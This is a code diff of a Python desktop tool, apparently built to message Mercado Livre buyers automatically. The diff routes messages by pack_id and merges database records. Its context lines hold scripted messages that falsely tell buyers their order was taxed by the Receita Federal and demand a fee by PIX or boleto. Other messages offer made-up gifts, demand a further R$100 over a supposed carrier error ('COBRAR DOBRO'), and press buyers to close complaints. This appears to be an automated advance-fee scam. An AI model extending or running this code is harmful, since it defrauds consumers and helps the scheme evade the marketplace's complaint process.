@@ -7834,6 +7834,7 @@ class AppColetorPro:
                 corProduto = ""   
                 claim_id = None
                 executar_reclamacao = self._registro_eh_reclamacao(pedido, executar_reclamacao)
+                pack_id = str(pedido.get('pack_id')) if pedido.get('pack_id') else None
 
                 
                 
@@ -7842,6 +7843,8 @@ class AppColetorPro:
                     
                     order_id = tratado[0]
                     claim_id = tratado[1]
+                    if pack_id:
+                        order_id = self._migrar_registro_para_pack(db, order_id, pack_id)
                     # 1. Pegamos os dados do pedido no DB com segurança
                     info_pedido = db.get(order_id)
                     
@@ -7871,12 +7874,12 @@ class AppColetorPro:
                                     # Caso a estrutura da API seja muito diferente do esperado
                                     self.logger(f"Erro ao processar estrutura de dadosProduto para o order_id: {order_id}")
                 else:
-                    order_id = str(pedido.get('pack_id') or pedido['id'])
+                    order_id = self._chave_db_para_pedido(db, pedido)
                     buyer_id = str(pedido.get('buyer', {}).get('id'))
                     nome_prod = str(pedido['payments'][0]['reason']) 
                     valor = str(pedido['total_amount'])
                     corProduto = str(pedido['order_items'][0]['item']['variation_attributes'][0]['value_name']) 
-                    pack_id = str(pedido.get('pack_id'))
+                    # pack_id já definido no início do pedido
                     
                     #if order_id not in db:
                         #self.logger(f"Ordem {order_id} ignorada (não está na lista do banco de dados).")
@@ -7889,18 +7892,18 @@ class AppColetorPro:
                         self.logger("Erro: Para processamento por ID, o campo 'Ordem IDs' deve ser preenchido.", "ERRO")
                         return
                     ordem_ids = [oid.strip() for oid in ordem_ids_input.split(",")]
-                    if order_id not in ordem_ids:
+                    if order_id not in ordem_ids and str(pedido.get('id')) not in ordem_ids:
                         self.logger(f"Ordem {order_id} ignorada (não está na lista de IDs).")
                         continue
                     
                 
-                ALVO_TESTE = "2000015420001643"
-                if order_id == ALVO_TESTE or str(pedido.get('pack_id')) == ALVO_TESTE:
+                #ALVO_TESTE = "2000015420001643"
+                #if order_id == ALVO_TESTE or str(pedido.get('pack_id')) == ALVO_TESTE:
                     # segue executando o código normal aqui dentro
-                   pass
-                else:
-                   self.logger(f"Ordem {order_id} ignorada (não está na lista de IDs do teste).")
-                   continue
+                #   pass
+                #else:
+                #  self.logger(f"Ordem {order_id} ignorad1a (não está na lista de IDs do teste).")
+                #   continue
 
                 if order_id not in db:
                     #self.logger(f"Ordem {order_id} ignorada (não está na lista do banco de dados).")
@@ -7962,16 +7965,16 @@ class AppColetorPro:
                             self.logger(f"Enviando PIX para pagamento de taxa para a ordem {order_id}...")
 
                             text = (f"Vamos gerar o pagamento agora mesmo!\n\nPara pagar a taxa de R$ {formatar_valor_br(get_valor_taxa_pedido(dados_pedido))} via PIX, é só copiar a chave PIX abaixo e pagar pelo aplicativo do seu Banco: 👇")
-                            envioMsgPrePix = self.enviarMSG(order_id, buyer_id, text, headers, config['ML_SELLER_ID'], executar_reclamacao, claim_id)
+                            envioMsgPrePix = self.enviarMSG(order_id, buyer_id, text, headers, config['ML_SELLER_ID'], executar_reclamacao, claim_id, pack_id)
                             if envioMsgPrePix:
                                 # -- CHAVE PIX
-                                envioChavePix = self.enviarMSG(order_id, buyer_id, f"{chave_pix}", headers, config['ML_SELLER_ID'], executar_reclamacao, claim_id)
+                                envioChavePix = self.enviarMSG(order_id, buyer_id, f"{chave_pix}", headers, config['ML_SELLER_ID'], executar_reclamacao, claim_id, pack_id)
                                 if envioChavePix:
                                     # -- ENVIO COMPROVANTE
                                     dados_recebedor = montar_texto_recebedor_pix()
                                     prefixo_recebedor = f"\n{dados_recebedor}\n\n" if dados_recebedor else ""
                                     text = f"{prefixo_recebedor}Esperamos o comprovante! Att, Time {get_nome_loja()}".strip()
-                                    envioPixComprovante = self.enviarMSG(order_id, buyer_id, text, headers, config['ML_SELLER_ID'], executar_reclamacao, claim_id)
+                                    envioPixComprovante = self.enviarMSG(order_id, buyer_id, text, headers, config['ML_SELLER_ID'], executar_reclamacao, claim_id, pack_id)
                                     if envioPixComprovante:
                                         boletos_contagem += 1
                                         db[order_id]['boleto_enviado'] = True
@@ -8012,15 +8015,15 @@ class AppColetorPro:
                                break      
                                 
                             text = ("Vamos gerar o boleto agora mesmo!\n\nProntinho, boleto gerado! Só copiar todo o código de barras abaixo e pagar pelo aplicativo do seu Banco: 👇")
-                            envioMsgpreBoleto = self.enviarMSG(order_id, buyer_id, text, headers, config['ML_SELLER_ID'], executar_reclamacao, claim_id)
+                            envioMsgpreBoleto = self.enviarMSG(order_id, buyer_id, text, headers, config['ML_SELLER_ID'], executar_reclamacao, claim_id, pack_id)
                             if envioMsgpreBoleto:      
                                 # -- NUMERO BOLETO
                                 text = f"{boleto_numero}"
-                                envioBoleto = self.enviarMSG(order_id, buyer_id, text, headers, config['ML_SELLER_ID'], executar_reclamacao, claim_id)
+                                envioBoleto = self.enviarMSG(order_id, buyer_id, text, headers, config['ML_SELLER_ID'], executar_reclamacao, claim_id, pack_id)
                                 if envioBoleto:
                                      # -- ENVIO COMPROVANTE
                                     text = f"Esperamos o comprovante! Att, Time {get_nome_loja()}".strip()
-                                    envioBoletoComprovante = self.enviarMSG(order_id, buyer_id, text, headers, config['ML_SELLER_ID'], executar_reclamacao, claim_id)
+                                    envioBoletoComprovante = self.enviarMSG(order_id, buyer_id, text, headers, config['ML_SELLER_ID'], executar_reclamacao, claim_id, pack_id)
                                     if envioBoletoComprovante:
                                             boletos_contagem += 1
                                             planilhaok = self.atualizar_status_boleto(indice_boleto)
@@ -8069,19 +8072,19 @@ class AppColetorPro:
                             envioMsgAtraso = True
                             if reenviar_boleto_atraso:
                                 msgAtraso = ("Olá! Passando para pedir desculpas pela demora no envio do seu boleto. Tivemos uma pequena instabilidade, mas já foi resolvido! 👍")
-                                envioMsgAtraso = self.enviarMSG(order_id, buyer_id, msgAtraso, headers, config['ML_SELLER_ID'], executar_reclamacao, claim_id)
+                                envioMsgAtraso = self.enviarMSG(order_id, buyer_id, msgAtraso, headers, config['ML_SELLER_ID'], executar_reclamacao, claim_id, pack_id)
                             if envioMsgAtraso:
                                     # -- AVISO PRÉ BOLETO
                                 text = ("Vamos gerar o boleto agora mesmo!\n\nProntinho, boleto gerado! Só copiar todo o código de barras abaixo e pagar pelo aplicativo do seu Banco: 👇")
-                                envioMsgpreBoleto = self.enviarMSG(order_id, buyer_id, text, headers, config['ML_SELLER_ID'], executar_reclamacao, claim_id)
+                                envioMsgpreBoleto = self.enviarMSG(order_id, buyer_id, text, headers, config['ML_SELLER_ID'], executar_reclamacao, claim_id, pack_id)
                                 if envioMsgpreBoleto:      
                                     # -- NUMERO BOLETO
                                     text = f"{boleto_numero}"
-                                    envioBoleto = self.enviarMSG(order_id, buyer_id, text, headers, config['ML_SELLER_ID'], executar_reclamacao, claim_id)
+                                    envioBoleto = self.enviarMSG(order_id, buyer_id, text, headers, config['ML_SELLER_ID'], executar_reclamacao, claim_id, pack_id)
                                     if envioBoleto:
                                         # -- ENVIO COMPROVANTE
                                         text = f"Esperamos o comprovante! Att, Time {get_nome_loja()}".strip()
-                                        envioBoletoComprovante = self.enviarMSG(order_id, buyer_id, text, headers, config['ML_SELLER_ID'], executar_reclamacao, claim_id)
+                                        envioBoletoComprovante = self.enviarMSG(order_id, buyer_id, text, headers, config['ML_SELLER_ID'], executar_reclamacao, claim_id, pack_id)
                                         if envioBoletoComprovante:
                                                 boletos_contagem += 1
                                                 planilhaok = self.atualizar_status_boleto(indice_boleto)
@@ -8111,7 +8114,7 @@ class AppColetorPro:
                         elif dados_pedido.get('boleto_enviado') and not dados_pedido.get('boleto_pago') and env_erroBoleto:
                             # --- ENVIO ATUALIZAR BOLETO 
                             text = ("Olá, tudo bem?\nPor favor, desconsidere o código de barras enviado anteriormente, pois houve um erro na atualização do sistema.\nSegue o novo código de barras para pagamento da taxa: 👇\n")
-                            envio = self.enviarMSG(order_id, buyer_id, text, headers, config['ML_SELLER_ID'], executar_reclamacao, claim_id) 
+                            envio = self.enviarMSG(order_id, buyer_id, text, headers, config['ML_SELLER_ID'], executar_reclamacao, claim_id, pack_id) 
                             if envio:
                                 boleto_numero = None
                                 indice_boleto = None
@@ -8129,11 +8132,11 @@ class AppColetorPro:
                                     break    
                                 # -- NUMERO BOLETO
                                 text = f"{boleto_numero}"
-                                envioBoleto = self.enviarMSG(order_id, buyer_id, text, headers, config['ML_SELLER_ID'], executar_reclamacao, claim_id) 
+                                envioBoleto = self.enviarMSG(order_id, buyer_id, text, headers, config['ML_SELLER_ID'], executar_reclamacao, claim_id, pack_id) 
                                 if envioBoleto:
                                     # -- ENVIO COMPROVANTE
                                     text = f"Esperamos o comprovante! Att, Time {get_nome_loja()}".strip()
-                                    envioBoletoComprovante = self.enviarMSG(order_id, buyer_id, text, headers, config['ML_SELLER_ID'], executar_reclamacao, claim_id)
+                                    envioBoletoComprovante = self.enviarMSG(order_id, buyer_id, text, headers, config['ML_SELLER_ID'], executar_reclamacao, claim_id, pack_id)
                                     if envioBoletoComprovante:
                                         planilhaok = self.atualizar_status_boleto(indice_boleto)
                                         if planilhaok:
@@ -8154,7 +8157,7 @@ class AppColetorPro:
                         elif dados_pedido.get('boleto_enviado') and (dados_pedido.get('boleto_pago') or dados_pedido.get('pago_via_pix')) and not dados_pedido.get('boleto_pago_agradecimento') and env_boleto_agradecimento:
                             # --- ENVIO AGRADECIMENTO (BOLETO PAGO ou PIX confirmado no chat pelo analista)
                             text = (f"Obrigado, o pagamento da taxa foi realizado. \n\n Vamos dar continuidade a entrega.\n\nO seu pedido vai chegar {self.var_data_entrega.get().strip()} no período da tarde! 😉")
-                            envio = self.enviarMSG(order_id, buyer_id, text, headers, config['ML_SELLER_ID'], executar_reclamacao, claim_id)
+                            envio = self.enviarMSG(order_id, buyer_id, text, headers, config['ML_SELLER_ID'], executar_reclamacao, claim_id, pack_id)
                             if envio:
                                 db[order_id]['boleto_pago_agradecimento'] = True
                                 self._salvar_db_periodico(db, i, len(pedidos))
@@ -8178,7 +8181,7 @@ class AppColetorPro:
                             text = ("Olá! Identificamos que há uma taxa pendente para a liberação do seu pedido. "
                                     "Para que a transportadora possa dar continuidade à entrega, solicitamos o pagamento do valor informado. "
                                     "Caso já tenha efetuado o pagamento, por favor, desconsidere esta mensagem.")
-                            envio = self.enviarMSG(order_id, buyer_id, text, headers, config['ML_SELLER_ID'], executar_reclamacao, claim_id)
+                            envio = self.enviarMSG(order_id, buyer_id, text, headers, config['ML_SELLER_ID'], executar_reclamacao, claim_id, pack_id)
                             if envio:
                                 db[order_id]['cobranca_nao_pago_enviada'] = True
                                 db[order_id]['data_cobranca_nao_pago'] = datetime.now().strftime("%d/%m/%Y %H:%M")
@@ -8209,7 +8212,7 @@ class AppColetorPro:
                             text = ("Olá! Precisamos da sua autorização para dar andamento."
                                     "Caso não receba a confirmação, o pedido sera cancelado automaticamente. "
                                     f"\nPara receber {_item_taxa} da taxa, DIGITE 1.")
-                            envio = self.enviarMSG(order_id, buyer_id, text, headers, config['ML_SELLER_ID'], executar_reclamacao, claim_id)
+                            envio = self.enviarMSG(order_id, buyer_id, text, headers, config['ML_SELLER_ID'], executar_reclamacao, claim_id, pack_id)
                             
                             if not dados_pedido.get('avisoBrinde'):
                                 pasta_imagens_brinde = self.encontrar_pasta_imagens_brindes("Brindes")
@@ -8217,14 +8220,14 @@ class AppColetorPro:
                                 textoBrinde = (f"Tivemos uma taxa de importação de R$ {formatar_valor_br(get_valor_taxa_pedido(dados_pedido))}, um valor abaixo da média aplicada pela Receita Federal para esse tipo de produto.\n\n"
                                                "Para compensar o transtorno, estamos te presenteando com: montagem grátis, " 
                                                "3 vasos de cerâmica, um suporte de TV e 2 puffs para sua sala!")
-                                envioBrinde = self.enviarMSG(order_id, buyer_id, textoBrinde, headers, config['ML_SELLER_ID'], executar_reclamacao, claim_id)
+                                envioBrinde = self.enviarMSG(order_id, buyer_id, textoBrinde, headers, config['ML_SELLER_ID'], executar_reclamacao, claim_id, pack_id)
                                 if envioBrinde:
                                     self.logger(f"Mensagem de brinde enviada para a ordem {order_id}.")
                                     if pasta_imagens_brinde:
                                         envioImagemBrinde = self.enviarImagensML(
                                             order_id, buyer_id, headers,
                                             config['ML_SELLER_ID'], executar_reclamacao, claim_id,
-                                            pasta_imagens_brinde
+                                            pasta_imagens_brinde, pack_id=pack_id
                                         )
                                         if envioImagemBrinde:
                                             self.logger(f"Imagem(ns) de brinde enviada(s) para a ordem {order_id}.")
@@ -8246,7 +8249,7 @@ class AppColetorPro:
                         elif dados_pedido.get('boleto_pago') and dados_pedido.get('boleto_pago_agradecimento') and not dados_pedido.get('cobrado_dobro') and cobrar_dobrado:
                             #COBRAR DOBRO
                             text = (f"Olá, tudo bem?\n\nOcorreu um erro aqui de comunicação com a transportadora e a receita\n\nA taxa era R${formatar_valor_br(get_valor_taxa_pedido(dados_pedido) + 100)} e passaram R${formatar_valor_br(get_valor_taxa_pedido(dados_pedido))}, foi um erro da transportadora\n\nFalta mais R$100 pra pagar a taxa, para a transportadora entregar o seu painel que chegará na {self.var_data_entrega.get().strip()}")
-                            envio = self.enviarMSG(order_id, buyer_id, text, headers, config['ML_SELLER_ID'], executar_reclamacao, claim_id)
+                            envio = self.enviarMSG(order_id, buyer_id, text, headers, config['ML_SELLER_ID'], executar_reclamacao, claim_id, pack_id)
                             if envio:
                                 if cobrar_dobrado_metodo == "pix":
                                     db[order_id]['cobrado_dobro'] = True
@@ -8274,13 +8277,13 @@ class AppColetorPro:
                                 trecho_pagamento = "O pagamento é feito exclusivamente pelo boleto do Mercado Pago que enviamos. A transportadora utiliza o sistema do Mercado Pago para garantir a segurança da plataforma. Assim que você autorizar, o boleto será gerado."
                             valor_taxa_msg = get_valor_boleto()  # valor informado agora na tela; será gravado na venda
                             text = (f"Olá, tudo bem?\nO seu painel importado chegou no Brasil. 🥳\nPorém, a Receita Federal taxou o seu produto no valor de R$ {formatar_valor_br(valor_taxa_msg)}.\n\nÉ necessário realizar o pagamento desta taxa, para dar continuidade na entrega. Caso seja pago hoje, o seu pedido chegará " + self.var_data_entrega.get().strip() + " 😉\n\n" + trecho_pagamento)
-                            envio = self.enviarMSG(order_id, buyer_id, text, headers, config['ML_SELLER_ID'], executar_reclamacao, claim_id)
+                            envio = self.enviarMSG(order_id, buyer_id, text, headers, config['ML_SELLER_ID'], executar_reclamacao, claim_id, pack_id)
                             if envio:
                                     if env_boleto_metodo == "pix":
                                         text = ("DIGITE 1\n\nPara que possamos enviar a chave PIX para pagamento da taxa e dar continuidade na entrega do seu pedido. 😉")
                                     else:
                                         text = ("DIGITE 1\n\nPara que possamos gerar o boleto para pagamento da taxa e dar continuidade na entrega do seu pedido. 😉")
-                                    envioMsgAutorizacao = self.enviarMSG(order_id, buyer_id, text, headers, config['ML_SELLER_ID'], executar_reclamacao, claim_id)
+                                    envioMsgAutorizacao = self.enviarMSG(order_id, buyer_id, text, headers, config['ML_SELLER_ID'], executar_reclamacao, claim_id, pack_id)
                                     if envioMsgAutorizacao:
                                         autorizar_contagem += 1
                                         db[order_id]['boleto_autorizado_msg'] = True
@@ -8308,7 +8311,7 @@ class AppColetorPro:
                             envioMsgAtraso = True
                             if reenviar_boleto_dobrado_atraso:
                                 msgAtraso = ("Olá! Passando para pedir desculpas pela demora no envio do restante da taxa. Tivemos uma pequena instabilidade, mas já foi resolvido! 👍")
-                                envioMsgAtraso = self.enviarMSG(order_id, buyer_id, msgAtraso, headers, config['ML_SELLER_ID'], executar_reclamacao, claim_id)
+                                envioMsgAtraso = self.enviarMSG(order_id, buyer_id, msgAtraso, headers, config['ML_SELLER_ID'], executar_reclamacao, claim_id, pack_id)
 
                             if envioMsgAtraso:
                                 boleto_numero = None
@@ -8326,13 +8329,13 @@ class AppColetorPro:
                                     break
 
                                 text = ("Vamos gerar o boleto agora mesmo!\n\nProntinho, boleto gerado! Só copiar todo o código de barras abaixo e pagar pelo aplicativo do seu Banco: 👇")
-                                envioMsgpreBoleto = self.enviarMSG(order_id, buyer_id, text, headers, config['ML_SELLER_ID'], executar_reclamacao, claim_id)
+                                envioMsgpreBoleto = self.enviarMSG(order_id, buyer_id, text, headers, config['ML_SELLER_ID'], executar_reclamacao, claim_id, pack_id)
                                 if envioMsgpreBoleto:
                                     text = f"{boleto_numero}"
-                                    envioBoleto = self.enviarMSG(order_id, buyer_id, text, headers, config['ML_SELLER_ID'], executar_reclamacao, claim_id)
+                                    envioBoleto = self.enviarMSG(order_id, buyer_id, text, headers, config['ML_SELLER_ID'], executar_reclamacao, claim_id, pack_id)
                                     if envioBoleto:
                                         text = f"Esperamos o comprovante! Att, Time {get_nome_loja()}".strip()
-                                        envioBoletoComprovante = self.enviarMSG(order_id, buyer_id, text, headers, config['ML_SELLER_ID'], executar_reclamacao, claim_id)
+                                        envioBoletoComprovante = self.enviarMSG(order_id, buyer_id, text, headers, config['ML_SELLER_ID'], executar_reclamacao, claim_id, pack_id)
                                         if envioBoletoComprovante:
                                             planilhaok = self.atualizar_status_boleto(indice_boleto)
                                             if planilhaok:
@@ -8410,7 +8413,7 @@ class AppColetorPro:
                                    
                             
                             # --- ENVIO DA MENSAGEM (Caso não esteja no DB e não esteja no Chat) ---
-                            envio = self.enviarMSG(order_id, buyer_id, text, headers, config['ML_SELLER_ID'], executar_reclamacao, claim_id)
+                            envio = self.enviarMSG(order_id, buyer_id, text, headers, config['ML_SELLER_ID'], executar_reclamacao, claim_id, pack_id)
                             if(envio):
                                 db[order_id]['rastreio_enviado'] = True
                                 db[order_id]['data_rastreio'] = datetime.now().strftime("%d/%m/%Y %H:%M")
@@ -8461,10 +8464,10 @@ class AppColetorPro:
                                         if not dados_pedido.get('rastreio_enviado'):
                                             # -- AGRADECER TELEFONE
                                             text = "Olá! recebemos seu telefone. Obrigado! \nVamos dar continuidade ao processo de envio do seu pedido. \nAssim que o código de rastreio estiver disponível, enviaremos para você acompanhar a entrega. 😉"
-                                            envio = self.enviarMSG(order_id, buyer_id, text, headers, config['ML_SELLER_ID'], executar_reclamacao, claim_id)
+                                            envio = self.enviarMSG(order_id, buyer_id, text, headers, config['ML_SELLER_ID'], executar_reclamacao, claim_id, pack_id)
                                         elif dados_pedido.get('rastreio_enviado') and not dados_pedido.get('boleto_enviado'):
                                             text = "Olá! recebemos seu telefone. Obrigado!😉"
-                                            envio = self.enviarMSG(order_id, buyer_id, text, headers, config['ML_SELLER_ID'], executar_reclamacao, claim_id)  
+                                            envio = self.enviarMSG(order_id, buyer_id, text, headers, config['ML_SELLER_ID'], executar_reclamacao, claim_id, pack_id)  
                                            
                                         break
                          
@@ -8478,7 +8481,7 @@ class AppColetorPro:
                                         if(not dados_pedido.get('rastreio_enviado')):
                                             # -- COBRAR NUMERO TELEFONE
                                             text = "Olá! Não recebemos o seu telefone. \nA transportadora precisa pra preencher os seus dados de entrega e enviar o código de rastreio pra você acompanhar."
-                                            envio = self.enviarMSG(order_id, buyer_id, text, headers, config['ML_SELLER_ID'], executar_reclamacao , claim_id)
+                                            envio = self.enviarMSG(order_id, buyer_id, text, headers, config['ML_SELLER_ID'], executar_reclamacao , claim_id, pack_id)
                                             if envio:
                                                 db[order_id]['data_solicitacao'] = datetime.now().strftime("%d/%m/%Y %H:%M")
                                                 db[order_id]['tentativa_'] = dados_pedido.get('tentativa_', 0) + 1
@@ -8492,7 +8495,7 @@ class AppColetorPro:
                             if executar_reclamacao:   
                                 try:   
                                     if not dados_pedido.get('boleto_enviado') and solicitar and not dados_pedido.get('boleto_autorizado_msg'):
-                                        self.enviar_msg_encerrar_reclamacao(order_id, db[order_id]['buyer_id'], headers, config['ML_SELLER_ID'], claim_id, db)
+                                        self.enviar_msg_encerrar_reclamacao(order_id, db[order_id]['buyer_id'], headers, config['ML_SELLER_ID'], claim_id, db, pack_id)
                                 except Exception as e:
                                     self.logger(f"Erro ao enviar mensagem de encerramento para ordem {order_id}: {e}", "ERRO")        
                             self.logger(f"Mensagem já Enviada no chat da Ordem {order_id}...")
@@ -8543,7 +8546,7 @@ class AppColetorPro:
                     if executar_reclamacao:   
                         try:   
                             if not dados_pedido.get('boleto_enviado') and solicitar and not dados_pedido.get('boleto_autorizado_msg'):
-                                dontuse = self.enviar_msg_encerrar_reclamacao(order_id, db[order_id]['buyer_id'], headers, config['ML_SELLER_ID'], claim_id, db)
+                                dontuse = self.enviar_msg_encerrar_reclamacao(order_id, db[order_id]['buyer_id'], headers, config['ML_SELLER_ID'], claim_id, db, pack_id)
                                 # Agora a função já salva internamente, retorna apenas True/False
                         except Exception as e:
                             self.logger(f"Erro ao enviar mensagem de encerramento para ordem {order_id}: {e}", "ERRO")        
@@ -8653,7 +8656,7 @@ class AppColetorPro:
 
         return self._verificar_autorizacao_via_ia(order_id, mensagens_cliente)
 
-    def _enviar_aviso_pix_para_boleto(self, order_id, buyer_id, headers, seller_id, reclamacao, claim_id, codigo_boleto):
+    def _enviar_aviso_pix_para_boleto(self, order_id, buyer_id, headers, seller_id, reclamacao, claim_id, codigo_boleto, pack_id=None):
         """Envia ao cliente: aviso do problema com a chave PIX, código do boleto ASAAS e pedido de comprovante.
         Textos são sugestões e podem ser editados aqui. Retorna True só se as quatro mensagens forem enviadas."""
         mensagens = [
@@ -8663,7 +8666,7 @@ class AppColetorPro:
             f"Esperamos o comprovante! Att, Time {get_nome_loja()}",
         ]
         for texto in mensagens:
-            ok = self.enviarMSG(order_id, buyer_id, texto, headers, seller_id, reclamacao, claim_id)
+            ok = self.enviarMSG(order_id, buyer_id, texto, headers, seller_id, reclamacao, claim_id, pack_id)
             if not ok:
                 self.logger(f"Falha ao enviar mensagem do aviso PIX → boleto para a ordem {order_id}.", "ERRO")
                 return False
@@ -8683,6 +8686,11 @@ class AppColetorPro:
             order_id, claim_id = str(tratado[0]), str(tratado[1])
         else:
             order_id = str(pedido.get('pack_id') or pedido.get('id'))
+
+        pack_id = str(pedido.get('pack_id')) if pedido.get('pack_id') else None
+        if pack_id:
+            ordem_original = order_id if eh_reclamacao else str(pedido.get('id'))
+            order_id = self._migrar_registro_para_pack(db, ordem_original, pack_id)
 
         # Filtro de lote aplicado de novo, agora sobre a ordem já resolvida
         if lote_filtro_ids is not None and order_id not in lote_filtro_ids:
@@ -8714,7 +8722,7 @@ class AppColetorPro:
         self.logger(f"Enviando aviso PIX → boleto ASAAS para a ordem {order_id}...")
         headers = {"Authorization": f"Bearer {token}"}
         enviado = self._enviar_aviso_pix_para_boleto(
-            order_id, buyer_id, headers, seller_id, eh_reclamacao, claim_id, boleto_info["numero"])
+            order_id, buyer_id, headers, seller_id, eh_reclamacao, claim_id, boleto_info["numero"], pack_id)
         if not enviado:
             return "falha"
 
@@ -9010,27 +9018,26 @@ class AppColetorPro:
                 "text": texto
             }
             try:
-                info_venda = self.resolver_venda_ml(order_id, headers)
-                if info_venda["tipo"] is None:
-                    self.logger(f"Venda {order_id} não identificada ({info_venda['motivo']}). Mensagem NÃO enviada.", "ERRO")
-                    return False
-                chave_msg = self.chave_mensagem_ml(info_venda)
-                url_msg = f"https://api.mercadolibre.com/messages/packs/{chave_msg}/sellers/{ML_SELLER_ID}?tag=post_sale"
+                if pack_id:
+                    chave_principal = str(pack_id)
+                else:
+                    info_venda = self.resolver_venda_ml(order_id, headers)
+                    if info_venda["tipo"] is None:
+                        self.logger(f"Venda {order_id} não identificada ({info_venda['motivo']}). Mensagem NÃO enviada.", "ERRO")
+                        return False
+                    chave_principal = str(self.chave_mensagem_ml(info_venda))
+
+                url_msg = f"https://api.mercadolibre.com/messages/packs/{chave_principal}/sellers/{ML_SELLER_ID}?tag=post_sale"
                 envio = SESSION.post(url_msg, json=payload, headers=headers, timeout=15)
 
-                # Fallback: se retornar 400, tenta novamente usando o pack_id
-                if (
-                    envio.status_code == 400
-                    and pack_id
-                    and str(pack_id) != str(order_id)
-                ):
+                # Fallback: se o pack retornar 400, tenta novamente com o order_id
+                if envio.status_code == 400 and str(order_id) != chave_principal:
                     self.logger(
-                        f"Envio de mensagem COMUM {order_id} retornou 400 "
-                        f"({self._detalhar_erro_ml(envio)}). "
-                        f"Tentando novamente com pack_id {pack_id}",
+                        f"Envio de mensagem COMUM {order_id} (pack {chave_principal}) retornou 400 "
+                        f"({self._detalhar_erro_ml(envio)}). Tentando novamente com order_id {order_id}",
                         "AVISO"
                     )
-                    url_msg = f"https://api.mercadolibre.com/messages/packs/{pack_id}/sellers/{ML_SELLER_ID}?tag=post_sale"
+                    url_msg = f"https://api.mercadolibre.com/messages/packs/{order_id}/sellers/{ML_SELLER_ID}?tag=post_sale"
                     envio = SESSION.post(url_msg, json=payload, headers=headers, timeout=15)
 
                 if envio.status_code in [200, 201]:
@@ -9051,7 +9058,7 @@ class AppColetorPro:
                 return False
 
     
-    def enviarImagensML(self, order_id, buyer_id, headers, ML_SELLER_ID,reclamacao, claim_id, pasta_imagens, site_id="MLB"):
+    def enviarImagensML(self, order_id, buyer_id, headers, ML_SELLER_ID,reclamacao, claim_id, pasta_imagens, site_id="MLB", pack_id=None):
         """
         Envia uma mensagem contendo APENAS as imagens (sem texto),
         anexando todas as imagens encontradas na pasta.
@@ -9116,7 +9123,7 @@ class AppColetorPro:
                     "attachments": attachment_ids
                 }
             else:
-                url_msg = f"https://api.mercadolibre.com/messages/packs/{order_id}/sellers/{ML_SELLER_ID}?tag=post_sale"
+                url_msg = f"https://api.mercadolibre.com/messages/packs/{pack_id or order_id}/sellers/{ML_SELLER_ID}?tag=post_sale"
                 payload = {
                     "from": {"user_id": ML_SELLER_ID},
                     "to": {"user_id": buyer_id},
@@ -9135,7 +9142,7 @@ class AppColetorPro:
             self.logger(f"Erro ao enviar mensagem com imagens para {buyer_id}: {str(e)}", "ERRO")
             return False
     
-    def enviar_msg_encerrar_reclamacao(self, order_id, buyer_id, headers, ML_SELLER_ID, claim_id, db):
+    def enviar_msg_encerrar_reclamacao(self, order_id, buyer_id, headers, ML_SELLER_ID, claim_id, db, pack_id=None):
         """
         Envia mensagem para o cliente encerrar a reclamação.
         Máximo 2x por ordem, apenas se o boleto ainda não foi enviado.
@@ -9694,6 +9701,41 @@ class AppColetorPro:
         return pedido["buyer"]["first_name"]
 
     # # ALTERAÇÃO: Ajustado para usar a pasta do e-mail
+    def _migrar_registro_para_pack(self, db, order_id, pack_id):
+        """
+        Garante que o registro da venda fique na chave do pack_id.
+        Se a venda antiga (chave = order_id) existir, move/mescla para a chave do pack.
+        Retorna a chave final a ser usada no banco.
+        """
+        order_id = str(order_id or "")
+        pack_id = str(pack_id or "")
+        if not pack_id or not order_id or order_id == pack_id:
+            return pack_id or order_id
+
+        if order_id in db:
+            if pack_id in db:
+                antigo = db.pop(order_id)
+                novo = db[pack_id]
+                for campo, valor in antigo.items():
+                    if valor not in (None, "") and novo.get(campo) in (None, ""):
+                        novo[campo] = valor
+                self.logger(f"Venda {order_id} unificada ao pack {pack_id} (sem duplicar).", "AVISO")
+            else:
+                db[pack_id] = db.pop(order_id)
+                self.logger(f"Venda {order_id} agrupada no pack {pack_id}. Registro migrado.", "AVISO")
+
+        if pack_id in db:
+            db[pack_id]['pack_id'] = pack_id
+        return pack_id
+
+    def _chave_db_para_pedido(self, db, pedido):
+        """Chave do banco para um pedido vindo da API (pack_id se existir, senão order id)."""
+        order_id = str(pedido.get('id') or '')
+        pack_id = str(pedido.get('pack_id') or '') if pedido.get('pack_id') else ''
+        if not pack_id:
+            return order_id
+        return self._migrar_registro_para_pack(db, order_id, pack_id)
+
     def carregar_db(self):
         folder = self.get_pasta_conta()
         if not folder:
